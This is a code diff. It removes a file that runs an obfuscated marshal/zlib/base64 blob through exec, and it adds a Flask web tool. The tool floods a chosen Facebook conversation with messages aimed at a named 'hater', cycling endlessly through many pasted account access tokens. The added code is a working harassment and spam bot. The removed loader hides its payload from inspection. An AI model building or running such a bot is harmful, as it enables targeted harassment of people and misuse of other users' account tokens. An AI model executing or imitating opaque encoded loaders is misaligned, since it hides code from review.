@@ -1,6 +1,152 @@
-#ENCODED BY : MUMIT ISLAM HIMU
-#ENCRYPTION : Py3 MARSHAL+ZLIB+B64
-#GITHUB : https://github.com/MUMIT-404-CYBER
-#----------------------------------------------
-import marshal, base64, zlib
-exec(marshal.loads(zlib.decompress(base64.b64decode(b'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'))))
+from flask import Flask, request, render_template, redirect, url_for
+import requests
+import time
+
+app = Flask(__name__)
+
+headers = {
+      'Connection': 'keep-alive',
+      'Cache-Control': 'max-age=0',
+      'Upgrade-Insecure-Requests': '1',
+      'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36',
+      'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+      'Accept-Encoding': 'gzip, deflate',
+      'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
+      'referer': 'www.google.com'
+  }
+
+
+@app.route('/')
+def index():
+      return '''<!DOCTYPE html>
+  <html lang="en">
+  <head>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <title>SAHIL 9NS4RI</title>
+      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
+      <style>
+          body {
+              background-color: White
+          }
+
+          .container {
+              max-width: 500px;
+              background-color: black
+              border-radius: 10px;
+              padding: 20px;
+              box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+              margin: 0 auto;
+              margin-top: 20px;
+          }
+
+          .header {
+              text-align: center;
+              padding-bottom: 20px;
+          }
+
+          .btn-submit {
+              width: 100%;
+              margin-top: 10px;
+          }
+
+          .footer {
+              text-align: center;
+              margin-top: 20px;
+              color: Balck
+          }
+      </style>
+  </head>
+  <body>
+  <header class="header mt-4">
+      <h1 class="mb-3">convo multi ids 0ffline tool</h1>
+      <h1 class="mt-3">0wn3r : Bholw4</h1>
+  </header>
+
+  <div class="container">
+      <form action="/" method="post" enctype="multipart/form-data">
+          <div class="mb-3">
+              <label for="convo_id">Convo ID:</label>
+              <input type="text" class="form-control" id="convo_id" name="convo_id" required>
+          </div>
+          <div class="mb-3">
+              <label for="haters_name">Enter Hater Name:</label>
+              <input type="text" class="form-control" id="haters_name" name="haters_name" required>
+          </div>
+          <div class="mb-3">
+              <label for="messages">Enter Messages (each on a new line):</label>
+              <textarea class="form-control" id="messages" name="messages" rows="5" required></textarea>
+          </div>
+          <div class="mb-3">
+              <label for="tokens">Enter Tokens (each on a new line):</label>
+              <textarea class="form-control" id="tokens" name="tokens" rows="5" required></textarea>
+          </div>
+          <div class="mb-3">
+              <label for="speed">Speed in Seconds:</label>
+              <input type="number" class="form-control" id="speed" name="speed" required>
+          </div>
+          <button type="submit" class="btn btn-primary btn-submit">Submit Your Details</button>
+      </form>
+  </div>
+  <footer class="footer">
+      <p>&copy; 2024 Bholw9. All Rights Reserved.</p>
+      <p>48 Hours Use For Free</p>
+      <p>Made with ❤️ by <a href="https://www.facebook.com/profile.php?id=100083151961248.onwer">Bholwa</a></p>
+  </footer>
+  </body>
+  </html>'''
+
+
+@app.route('/', methods=['GET', 'POST'])
+def send_message():
+      if request.method == 'POST':
+          tokens = [token.strip()
+                    for token in request.form.get('tokens').split('\n')]
+          convo_id = request.form.get('convo_id').strip()
+          messages = [msg.strip()
+                      for msg in request.form.get('messages').split('\n')]
+          haters_name = request.form.get('haters_name').strip()
+          speed = int(request.form.get('speed'))
+
+          num_messages = len(messages)
+          num_tokens = len(tokens)
+
+          # = f'https://graph.facebook.com/v15.0/{convo_id}/messages'
+          post_url = "https://graph.facebook.com/v15.0/{}/".format(
+              't_' + convo_id)
+
+          while True:
+              try:
+                  for message_index in range(num_messages):
+                      token_index = message_index % num_tokens
+                      access_token = tokens[token_index]
+
+                      message = messages[message_index]
+
+                      parameters = {'access_token': access_token,
+                                    'message': haters_name + ' ' + message}
+                      response = requests.post(
+                          post_url, json=parameters, headers=headers)
+
+                      current_time = time.strftime("%Y-%m-%d %I:%M:%S %p")
+                      if response.ok:
+                          print("[+] message No. {} Convo Id {} Token No. {}: {}".format(
+                              message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                          print("  - Time: {}".format(current_time))
+                          print("\n" * 2)
+                      else:
+                          print("[x] Failed to send message No. {} Convo Id {} Token No. {}: {}".format(
+                              message_index + 1, convo_id, token_index + 1, haters_name + ' ' + message))
+                          print("  - Time: {}".format(current_time))
+                          print("\n" * 2)
+                      time.sleep(speed)
+              except Exception as e:
+
+                  print(e)
+                  time.sleep(30)
+
+      return redirect(url_for('index'))
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0',port=5000)
